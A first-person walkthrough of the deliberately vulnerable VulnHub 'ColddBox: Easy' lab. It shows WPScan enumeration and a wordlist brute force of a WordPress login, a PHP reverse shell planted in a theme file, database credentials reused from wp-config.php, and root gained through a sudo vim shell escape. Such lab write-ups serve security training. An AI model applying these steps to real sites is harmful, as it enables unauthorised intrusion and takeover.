# VulnHub - Colddbox

https://www.vulnhub.com/entry/colddbox-easy,586/

I started by assigning the box to a "Nat Network" network with my Kali machine.

First basic startup setup with scan and discovery of services:   
( I knew my ip was 192.168.67.5 ):   
```bash
┌──(kali㉿kali)-[~]
└─$ ping google.com                   
PING google.com (216.58.210.174) 56(84) bytes of data.
64 bytes from hem08s07-in-f14.1e100.net (216.58.210.174): icmp_seq=1 ttl=57 time=22.0 ms
64 bytes from hem08s07-in-f14.1e100.net (216.58.210.174): icmp_seq=2 ttl=57 time=19.0 ms
64 bytes from hem08s07-in-f14.1e100.net (216.58.210.174): icmp_seq=3 ttl=57 time=20.8 ms
^C
--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 18.968/20.615/22.041/1.264 ms
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.67.*
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 05:05 EDT
Nmap scan report for 192.168.67.1
Host is up (0.00049s latency).
Nmap scan report for 192.168.67.2
Host is up (0.0011s latency).
Nmap scan report for 192.168.67.4
Host is up (0.00078s latency).
Nmap scan report for 192.168.67.5
Host is up (0.00015s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.51 seconds
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.67.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 05:05 EDT
Nmap scan report for 192.168.67.4
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ebf98c09bc536808c96e8969565973b (RSA)
|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)
|_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ 
```

WordPress site running.   
Proxy is up with Zap, so i browsed to the site: http://192.168.67.4/

![[colddbox_pics/colddbox_index.png]]

There was a "login" page, which is always good.   
As there was a author of the box/page mentioned, i of course tried that with placeholder password = `password`   
Intercepted the login, and started fuzzer for the password with wordlist (rockyou because i got all the time there is needed to get through the passes).

https://www.guyit.co.il/guides/bruteforce-a-form-to-get-credentials-with-zap   
![[colddbox_pics/colddbox_login_intercepted.png]]

Got a lot of (false) positives so decided to not proceed with that.   

This was the reason i chose this box in the first place:   

https://blog.sucuri.net/2021/05/wpscan-how-to-scan-for-wordpress-vulnerabilities.html   


WordPress Enumeration:  
```bash
┌──(kali㉿kali)-[~]
└─$ sudo wpscan --url http://192.168.67.4 -e  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.67.4/ [192.168.67.4]
[+] Started: Thu Apr 13 07:57:42 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.67.4/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.67.4/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.67.4/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.67.4/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://192.168.67.4/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.67.4/wp-content/themes/twentyfifteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://192.168.67.4/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.4
 | Style URL: http://192.168.67.4/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.67.4/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <====================================> (496 / 496) 100.00% Time: 00:00:00
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:04 <==================================> (2575 / 2575) 100.00% Time: 00:00:04

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=====================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <===========================================> (71 / 71) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Apr 13 07:57:54 2023
[+] Requests Done: 3396
[+] Cached Requests: 53
[+] Data Sent: 925.97 KB
[+] Data Received: 493.789 KB
[+] Memory used: 271.906 MB
[+] Elapsed time: 00:00:11
                           
```
Quite a lot of info!   

Found users, i went after `c0ldd`, as it is the author/owner of the page( mentioned in the index page).  

So next i launched the wordlist attack with WPScan for passwords on `c0lld`
```bash
└─$ wpscan --url http://192.168.67.4 -U c0ldd -P /usr/share/wordlists/rockyou.txt
```

```bash
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                      
Trying c0ldd / 9876543210 Time: 00:00:14 <                                 > (1225 / 14345618)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```
And found the logins.   

Got access to the admin panel:

![[colddbox_pics/colddbox_admin_panel.png]]

Next i searched the Web for `exploit wordpress 4.1.31` 

Tinkered around the admin panel for a while, as im not that familiar with WordPress overall.   
Also did alot of reading about it.   

I always check:   
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet   
Codes for reverse shells, but couldn't find suitable to use "as a page" in WordPress.   
So i found this from search.   
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php   

What i tried, was to create new page, edit existing page and replace them with that code.   But that only messed up the whole site...   

What i ended up doing, was to edit the theme.   
I replaced the 404.php theme, with the reverse shell code, and added my local ip and port there.     
![[colddbox_pics/coldboxx_theme_revshell.png]]

On my local/attacker machine, i had a listener ready:   
![[colddbox_pics/colddbox_kali_listener.png]]

As soon as i saved everything and went back to browse the site... It didnt work.

I tried to edit the theme of few other pages, until the "comments.php" worked.   
After editing that file, and browsing from the front page to "comments" i got the reverse shell:      
![[colddbox_pics/colddbox_revshell.png]]

Next i wanted a real shell, as this is some unstable thing.   
So from my notes ive gathered from:   
https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

```bash
$ python --version
/bin/sh: 1: python: not found
$ python3 --version
Python 3.5.2
$ 
```

Python was there in the victim, so:   
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Worked, and did a quick lookout of whats going on:   
```bash
www-data@ColddBox-Easy:/$ whoami
whoami
www-data
www-data@ColddBox-Easy:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ColddBox-Easy:/$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@ColddBox-Easy:/$ ls /home
ls /home
c0ldd
www-data@ColddBox-Easy:/$ su -l
su -l
Password: 

su: Authentication failure
www-data@ColddBox-Easy:/$ 
```

So next i needed to become `c0ldd`, or `root` so i started to check some secret stuffs.   

Found the user flag but couldn't read it   
```bash
www-data@ColddBox-Easy:/$ cd home
cd home
www-data@ColddBox-Easy:/home$ cd c0ldd  
cd c0ldd
www-data@ColddBox-Easy:/home/c0ldd$ ls
ls
user.txt
www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@ColddBox-Easy:/home/c0ldd$ ls -la
ls -la
total 24
drwxr-xr-x 3 c0ldd c0ldd 4096 Oct 19  2020 .
drwxr-xr-x 3 root  root  4096 Sep 24  2020 ..
-rw------- 1 c0ldd c0ldd    0 Oct 19  2020 .bash_history
-rw-r--r-- 1 c0ldd c0ldd  220 Sep 24  2020 .bash_logout
-rw-r--r-- 1 c0ldd c0ldd    0 Oct 14  2020 .bashrc
drwx------ 2 c0ldd c0ldd 4096 Sep 24  2020 .cache
-rw-r--r-- 1 c0ldd c0ldd  655 Sep 24  2020 .profile
-rw-r--r-- 1 c0ldd c0ldd    0 Sep 24  2020 .sudo_as_admin_successful
-rw-rw---- 1 c0ldd c0ldd   53 Sep 24  2020 user.txt
```

As there's web server running i went after `/var/www/*`

From `/var/www/html/wp-config.php` i found the credentials:   
```bash
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

```

User: c0ldd   
Pass: cybersecurity   

```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html$ id
id
uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
c0ldd@ColddBox-Easy:/var/www/html$
```

**And now i'm was an admin type of person!**   

Next i checked what i can run as `sudo` :   
```bash
c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
c0ldd@ColddBox-Easy:/var/www/html$
```

And the good old place for rootz, as i don't remember anything:   
https://gtfobins.github.io/   

`vim` sounded good, even i don't know how to use it, but that's not important!   

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

Profit!!   
```bash
:!/bin/bash
root@ColddBox-Easy:/var/www/html# id
id
uid=0(root) gid=0(root) grupos=0(root)
root@ColddBox-Easy:/var/www/html# ls
ls
hidden           wp-blog-header.php    wp-includes        wp-signup.php
index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
license.txt      wp-config.php         wp-load.php        xmlrpc.php
readme.html      wp-config-sample.php  wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
root@ColddBox-Easy:/var/www/html# whoami
whoami
root
root@ColddBox-Easy:/var/www/html# 
```

Then to get the flags, as i forgot the user flag already.    
```bash
root@ColddBox-Easy:/var/www/html#  cd /root
cd /root
root@ColddBox-Easy:/root# ls
ls
root.txt
root@ColddBox-Easy:/root# cat root.txt
cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
root@ColddBox-Easy:/root# cat /home/c0ldd/user.txt
cat /home/c0ldd/user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

*Total time:
Active hacking: ~3 h
Reading and studying: ~4 h
